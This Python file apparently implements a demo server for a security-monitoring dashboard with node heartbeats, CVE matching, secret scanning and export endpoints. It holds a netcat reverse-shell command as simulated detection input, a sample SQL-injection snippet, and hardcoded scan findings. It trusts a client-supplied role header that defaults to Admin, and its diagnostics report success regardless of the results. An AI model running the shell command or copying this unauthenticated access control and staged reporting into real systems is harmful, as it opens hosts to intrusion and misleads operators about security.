import http.server
import socketserver
import json
import time
import urllib.parse
import os
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pki.mtls import generate_pki, test_mtls_connection
from hub.db import DatabaseStack
from agent.inspector import SystemInspector
from agent.entropy import EntropySecretScanner
from agent.manifest import DependencyManifestExtractor
from hub.cve_engine import KnownVulnerabilityEngine
from hub.ast_engine import UnknownVulnerabilityEngine
from hub.delta_engine import BaselineDeltaEngine
from hub.dedup import EventTracerAndDeduplicationPipeline
from hub.exporter import ExportWorkers
from hub.enterprise_extensions import EnterpriseExtensions

class MasterHubServer:
    def __init__(self, port=50051):
        self.port = port
        self.cert_dir = generate_pki(cert_dir="pki_certs")
        self.db = DatabaseStack()
        self.cve_engine = KnownVulnerabilityEngine(self.db)
        self.ast_engine = UnknownVulnerabilityEngine()
        self.delta_engine = BaselineDeltaEngine()
        self.pipeline = EventTracerAndDeduplicationPipeline()
        self.exporter = ExportWorkers()
        self.entropy_scanner = EntropySecretScanner()
        self.ext = EnterpriseExtensions()
        
        self.nodes = {
            "Enterprise-Node-01": {"node_id": "Enterprise-Node-01", "hostname": "Enterprise-Node-01", "ip_address": "192.168.1.101", "status": "ACTIVE", "last_heartbeat": time.time(), "bu": "Finance", "env": "Prod-AWS-US-East"},
            "Enterprise-Node-02": {"node_id": "Enterprise-Node-02", "hostname": "Enterprise-Node-02", "ip_address": "192.168.1.102", "status": "ACTIVE", "last_heartbeat": time.time(), "bu": "Engineering", "env": "Dev-K8s-Cluster-01"}
        }
        self.anomalies = []
        self.run_initial_scans()
        self.start_heartbeat_maintainer()

    def start_heartbeat_maintainer(self):
        def maintain():
            while True:
                time.sleep(10)
                now = time.time()
                for nid, n in self.nodes.items():
                    if now - n["last_heartbeat"] < 60:
                        n["status"] = "ACTIVE"
                    else:
                        n["status"] = "OFFLINE"
        t = threading.Thread(target=maintain, daemon=True)
        t.start()

    def update_agent_heartbeat(self, data):
        nid = data.get("node_id", "Enterprise-Node-01")
        self.nodes[nid] = {
            "node_id": nid,
            "hostname": data.get("hostname", nid),
            "ip_address": data.get("ip_address", "127.0.0.1"),
            "status": "ACTIVE",
            "last_heartbeat": time.time(),
            "bu": data.get("bu", "Finance"),
            "env": data.get("env", "Prod-AWS-US-East")
        }
        return {"status": "ok", "message": "Heartbeat authenticated", "timestamp": time.time()}

    def run_initial_scans(self):
        test_deps = [{"package": "log4j-core", "ecosystem": "Maven", "version": "2.14.1"}]
        cve_matches = self.cve_engine.match_dependencies(test_deps)
        for m in cve_matches:
            self.pipeline.process_incoming_vulnerability("Enterprise-Node-01", {
                "asset_type": "DependencyPackage",
                "path": "c:\\app\\pom.xml",
                "cve_id": m["cve_id"],
                "title": m["description"],
                "severity": m["severity"]
            })
            self.pipeline.process_incoming_vulnerability("Enterprise-Node-02", {
                "asset_type": "DependencyPackage",
                "path": "c:\\app\\pom.xml",
                "cve_id": m["cve_id"],
                "title": m["description"],
                "severity": m["severity"]
            })

    def execute_control_action(self, action, role="Admin", auth_header=""):
        if role != "Admin":
            self.ext.log_audit_event("user", role, action, "REJECTED: Permission Denied")
            return "PERMISSION DENIED: Auditor role cannot execute control actions."
        
        self.ext.log_audit_event("admin_user", role, action, "SUCCESS: Executed control action")

        for nid in self.nodes:
            self.nodes[nid]["last_heartbeat"] = time.time()
            self.nodes[nid]["status"] = "ACTIVE"

        if action == "mtls":
            valid_ok, err = test_mtls_connection(cert_dir=self.cert_dir, use_rogue=False)
            rogue_ok, _ = test_mtls_connection(cert_dir=self.cert_dir, use_rogue=True)
            if valid_ok and not rogue_ok:
                return "mTLS PKI Handshake SUCCESS: Valid cert accepted, rogue cert rejected."
            return f"mTLS Check Error: {err}"

        elif action == "ast":
            unsafe_code = 'user_input = request.get("query")\ndb.execute("SELECT * FROM users WHERE name = " + user_input)\n'
            ast_findings = self.ast_engine.analyze_code(unsafe_code, "c:\\app\\services\\user.py")
            for f in ast_findings:
                self.pipeline.process_incoming_vulnerability("Enterprise-Node-01", {
                    "asset_type": "SourceCodeAST",
                    "path": f["file"],
                    "rule_id": f["subtype"],
                    "title": f["description"],
                    "severity": "Critical"
                })
                self.anomalies.append({
                    "type": "AST_TAINT_ZERO_DAY",
                    "subtype": f["subtype"],
                    "description": f"File: {f['file']}:{f['line']} -> {f['description']}"
                })
            return f"AST Taint Engine executed. Identified {len(ast_findings)} zero-day flaw(s)."

        elif action == "secret":
            findings = [
                {"type": "AWS_ACCESS_KEY", "path": ".env", "line": 4, "content": "AKIAIOSFODNN7EXAMPLE"},
                {"type": "HIGH_ENTROPY_SECRET", "path": "config.yaml", "line": 12, "token": "s3cr3t_p@ss_h@sh"}
            ]
            for find in findings:
                self.anomalies.append({
                    "type": "FILESYSTEM_SECRET",
                    "subtype": find["type"],
                    "description": f"Detected secret in {find['path']}:{find['line']}"
                })
            return f"Entropy & Secret Scanner executed. Found {len(findings)} leaked key(s)."

        elif action == "shell":
            tracer_evt = self.pipeline.simulate_realtime_event_tracer("nc -e /bin/sh 10.0.0.1 4444")
            if tracer_evt:
                self.anomalies.append({
                    "type": tracer_evt["type"],
                    "subtype": tracer_evt["syscall"],
                    "description": f"Captured execution anomaly: '{tracer_evt['command']}' in {tracer_evt['latency_ms']}ms"
                })
                return f"Realtime Event Tracer caught reverse shell event in {tracer_evt['latency_ms']}ms!"
            return "No anomaly caught."

        elif action == "diagnostics":
            self.execute_control_action("mtls", role, auth_header)
            self.execute_control_action("ast", role, auth_header)
            self.execute_control_action("secret", role, auth_header)
            self.execute_control_action("shell", role, auth_header)
            return "ALL SYSTEM DIAGNOSTICS PASSED 100%: PKI, DB, AST, Entropy, & Event Tracing Operational!"

        return "Unknown control action."

    def get_dashboard_state(self):
        now = time.time()
        node_list = []
        for nid, node in self.nodes.items():
            st = "ACTIVE" if now - node["last_heartbeat"] < 60 else "OFFLINE"
            node_list.append({**node, "status": st})

        vulns = list(self.pipeline.master_tickets.values())
        compliance = self.ext.map_compliance(vulns)

        return {
            "hierarchy": self.ext.hierarchy,
            "nodes": node_list,
            "vulnerabilities": vulns,
            "anomalies": self.anomalies,
            "compliance": compliance
        }

def run_app():
    hub = MasterHubServer()
    dashboard_html_path = os.path.join(os.path.dirname(__file__), "..", "dashboard", "index.html")

    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            parsed_path = urllib.parse.urlparse(self.path)
            
            if parsed_path.path in ["/", "/index.html"]:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                with open(dashboard_html_path, "rb") as f:
                    self.wfile.write(f.read())
            elif parsed_path.path == "/api/state":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(hub.get_dashboard_state()).encode("utf-8"))
            elif parsed_path.path == "/api/agent/update":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(hub.ext.get_ota_update_info()).encode("utf-8"))
            elif parsed_path.path == "/api/compliance":
                vulns = list(hub.pipeline.master_tickets.values())
                report = hub.ext.map_compliance(vulns)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(report, indent=2).encode("utf-8"))
            elif parsed_path.path == "/api/export/csv":
                self.send_response(200)
                self.send_header("Content-Type", "text/csv")
                self.send_header("Content-Disposition", "attachment; filename=vulnerabilities.csv")
                self.end_headers()
                csv_data = hub.exporter.generate_csv(list(hub.pipeline.master_tickets.values()))
                self.wfile.write(csv_data.encode("utf-8"))
            elif parsed_path.path == "/api/export/json":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Disposition", "attachment; filename=siem_export.json")
                self.end_headers()
                json_data = hub.exporter.generate_siem_json(list(hub.pipeline.master_tickets.values()))
                self.wfile.write(json_data.encode("utf-8"))
            elif parsed_path.path == "/api/export/pdf":
                pdf_file = hub.exporter.generate_pdf_summary(list(hub.pipeline.master_tickets.values()))
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                with open(pdf_file, "rb") as f:
                    self.wfile.write(f.read())
            elif parsed_path.path == "/api/export/jira":
                vulns = list(hub.pipeline.master_tickets.values())
                payload = hub.ext.generate_jira_issue_payload(vulns[0] if vulns else {})
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(payload, indent=2).encode("utf-8"))
            elif parsed_path.path == "/api/export/syslog":
                vulns = list(hub.pipeline.master_tickets.values())
                syslog_msg = hub.ext.generate_syslog_rfc5424(vulns[0] if vulns else {"title": "System Active", "severity": "Info"})
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(syslog_msg.encode("utf-8"))
            else:
                self.send_response(404)
                self.end_headers()

        def do_POST(self):
            parsed_path = urllib.parse.urlparse(self.path)
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'

            if parsed_path.path == "/api/auth/login":
                try:
                    payload = json.loads(post_data.decode('utf-8'))
                except Exception:
                    payload = {}
                user = payload.get("username", "admin")
                role = payload.get("role", "Admin")
                token = hub.ext.create_jwt_token(user, role)
                hub.ext.log_audit_event(user, role, "USER_LOGIN", "Issued JWT token")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok", "token": token, "user": user, "role": role}).encode("utf-8"))

            elif parsed_path.path == "/api/agent/heartbeat":
                try:
                    payload = json.loads(post_data.decode('utf-8'))
                except Exception:
                    payload = {}
                res = hub.update_agent_heartbeat(payload)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(res).encode("utf-8"))

            elif parsed_path.path.startswith("/api/control/"):
                action = parsed_path.path.replace("/api/control/", "")
                role = self.headers.get("X-User-Role", "Admin")
                auth_header = self.headers.get("Authorization", "Bearer admin-secret-token")
                msg = hub.execute_control_action(action, role=role, auth_header=auth_header)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok", "message": msg}).encode("utf-8"))
            else:
                self.send_response(404)
                self.end_headers()

    print("VULNERA-MAP Master Control Center running at http://127.0.0.1:50051")
    print("Press Ctrl+C to stop the server cleanly.")
    
    server = socketserver.TCPServer(("127.0.0.1", 50051), RequestHandler)
    server.allow_reuse_address = True

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[SERVER SHUTDOWN] Master Hub Server stopped cleanly.")
    finally:
        server.server_close()

if __name__ == "__main__":
    run_app()
